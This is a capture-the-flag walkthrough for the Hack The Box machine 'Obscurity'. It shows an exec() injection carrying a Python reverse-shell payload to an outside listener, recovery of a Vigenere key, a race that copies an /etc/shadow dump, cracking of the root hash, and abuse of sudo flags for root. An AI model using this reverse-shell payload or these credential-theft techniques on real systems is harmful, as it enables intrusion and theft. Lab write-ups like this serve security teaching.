---
layout: walkthrough
title: Obscurity
description: HTB walkthrough
logo: /assets/img/walkthroughs/obscurity_logo.png
show-avatar: false
permalink: /walkthroughs/obscurity.html
OS: Linux
difficulty: Medium
release: 30 Nov 2019
creator: <a href="https://www.hackthebox.eu/home/users/profile/83743">clubby789</a>
cleared: 3 Dec 2019
published: 2019 12 03
---

**Cliffs:** Find source code for the webserver in hidden directory and analyze it to figure out RCE that will give low privilege shell. In user directory there is a python encryption script we can use to figure out users password. As user we can run a python script meant to replace SSH that we can use to gain access to roots password hash or simply to access the root flag.

<h2 align="center">Enumeration</h2>


Starting with standard nmap scan...

```
# Nmap 7.80 scan initiated Sun Dec  1 14:14:06 2019 as: nmap -sC -sV -p- -oN nmapscan.txt 10.10.10.168                                                        
Nmap scan report for 10.10.10.168                             
Host is up (0.076s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)   
80/tcp   closed http 
8080/tcp open   http-proxy BadHTTPServer
_http-server-header: BadHTTPServer
_http-title: 0bscura
9000/tcp closed cslistener
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec  1 14:16:09 2019 -- 1 IP address (1 host up) scanned in 123.63 seconds
```

If we navigate to the website on port **8080** we see a webpage for a company with a rather interesting take on security. If we run **gobuster** or similar we won't find any useful directories. However reading the page, at the bottom we see 

![secret](/assets/img/walkthroughs/obscurity_webpage.png)

So we know there is a file for us to find, so lets use the following **wfuzz** command to find the directory

```
wfuzz -c -w /usr/share/wordlists/dirb/small.txt 10.10.10.168:8080/FUZZ/SuperSecureServer.py
```

![wfuzz](/assets/img/walkthroughs/obscurity_wfuzz.png)

Navigating to *ht<span>tp://</span>10.10.10.168:8080/develop/SuperSecureServer.py* we are greeted by the code.

Analyzing the code, in the serveDoc() function we see

```python
info = "output = 'Document: {}'" # Keep the output for later debug
exec(info.format(path)) # This is how you do string formatting, right?
```

Since we have control over the path, we can use that to get exec() to run code we want. We just need to make sure and correctly handle the closing of quotes, since the first part of the info variable is something we don't have control over (output = 'Document: ), nor is the very last character (a single quote). We want to get it into the form

```python
output = 'Document: '
<our code for a shell>
''
```

but since it's all one line in a string, we will use a semi colon. So info will actually look like

```python
info = "output = 'Document: ';<our code for a shell>;''"
```

so our path will be

```
10.10.10.168:8080/';<our shell code>;'
```

So what should we use to get a shell? We know the box is running python, so lets use the python reverse shell from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">PayloadsAllTheThings</a>. The script has already imported socket, subprocess, and os, so we can remove those. So our path is the following

```
10.10.10.168:8080/';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash");'
```

If we set a netcat listener and visit that url, we will found ourselves with a shell as user **www-data**

![shell](/assets/img/walkthroughs/obscurity_shell.png)

Enumerating the machine will turn up a number of interesting files in the */home/robert* directory.
We have **check.txt** which outputs

```
www-data@obscure:/home/robert$ cat check.txt 
Encrypting this file with your key should result in out.txt, make sure your key is correct! 
```

So it looks like we have a plaintext and a ciphertext (**out.txt**), so let's take a look at **SuperSecureCrypt.py** and see if we can figure out how it's encrypting things. Looking at the encrypt() function

```python
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted
```

The key line is

```python
newChr = chr((newChr + ord(keyChr)) % 255)
```

It is simply tacking a character from the plaintext and adding it to a character from the key and outputting the resulting character. This is a **Vigenere cipher**. So if we have *plaintext + key = ciphertext*, to get the key just like solving any formula we subtract plaintext from each side of the equation and have *key = ciphertext - plaintext*. We have a plaintext and ciphertext pair (check.txt and out.txt), so we could write a simple script to do the subtraction, but we don't need to. If we look at the decrypt() function we see it operates by subtracting the key from the ciphertext to give the plaintext. If instead we give it our plaintext as they key, it will give us the key. We copy the necessary files to */dev/shm* since we don't have write access in the robert directory

```
www-data@obscure:/dev/shm$ python3 SuperSecureCrypt.py -i out.txt -o key.txt -k "Encrypting this file with your key should result in out.txt, make sure your key is correct!" -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to key.txt...
www-data@obscure:/dev/shm$ cat key.txt
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
```

The key is **alexandrovich**, which we can now use to decrypt **passwordreminder.txt**, which decrypts to **SecThruObsFTW**, which is the ssh and user pass for robert, we now have access to user.txt

<h2 align="center">On To Root!</h2>
So now that we are user we can check out the **BetterSSH.py** file in */home/robert/BetterSSH/*. We could read it before, but as we will see the code is accessing the /etc/shadow file, so we need root permisions to make it work. Which we fortunately have with robert as we can see below

```
robert@obscure:~/BetterSSH$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

The script gets the password hashes from the */etc/shadow* file and then compares it to the hash of the password you enter for a user. If they match then it gives you a faux shell. 



**Method #1:** 
Fortunatelyfor us, for some reason the script also copies the output of the shadow file to a random file in */tmp/SSH*/ as shown in the snippet of code below

```python
passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
```

Unfortunately after it pauses for .1 seconds, every code path then leads to the deletion of that file. However, we don't need anymore time than that. Using **Watch** which is a linux program that runs a command repeatedly and also allows us to set the interval to .1 seconds, we will watch */tmp/SSH*/ and have it copy the directory every .1 seconds. When the password file is written to that directory, watch will grab a copy of it before it's deleted. We issue the following command

```
robert@obscure:~/BetterSSH$ watch -n .1 cp /tmp/SSH/* /dev/shm
```

Also make sure to create the */SSH/* directory if it doesn't already exist. Watch takes over the terminal, so we will need to open a seperate SSH session as robert so we can run the python script.

```
robert@obscure:/dev/shm$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py 
Enter username: Hilbert
Enter password: blahblahblah
Invalid user
robert@obscure:/dev/shm$ ls 
BCozoXF5
```

We have succesfuly copied the file. Looking at the file we can see the hash for user root is

```
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
```

Lets crack it! Using **John the ripper** and the wordlist **rockyou.txt**. We issue the following commands
![crack](/assets/img/walkthroughs/obscurity_mercedes.png)

As we can see the root password is *mercedes*. And we now have access to the root flag.

![root](/assets/img/walkthroughs/obscurity_root.png)



**Method #2:**
Looking at the script we see If we enter a correct password for user, we are authenticated and get a "shell"

```python
if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

Every command we enter is prefixed with *sudo -u \<username\>*, but since the script is running as root we can just append another *-u* flag on to execute commands as root. Since we have the password for robert we are able to authenticate via the script
![method2](/assets/img/walkthroughs/obscurity_method2.png)
